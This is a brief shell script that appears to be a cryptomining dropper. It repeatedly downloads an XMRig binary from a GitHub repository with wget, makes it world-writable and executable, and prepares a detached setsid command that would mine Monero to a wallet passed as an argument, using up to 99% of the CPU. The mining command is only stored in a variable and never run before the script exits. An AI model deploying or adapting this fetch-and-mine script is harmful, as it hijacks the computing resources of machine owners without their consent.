#! /bin/sh
PRO_NAME=xmrig_0c 
while true;do
	wget -T 15 -c -O ./xmrig_0c https://github.com/ak6665607/xmrGF/raw/main/xmrig && break
done 
chmod 777 ./xmrig_0c
qianbao=$1
CMD="setsid ./xmrig_0c --coin=monero -o pool.minexmr.com:4444 -u $qianbao --randomx-mode=fast --cpu-max-threads-hint 99 --threads=8"
exit 0
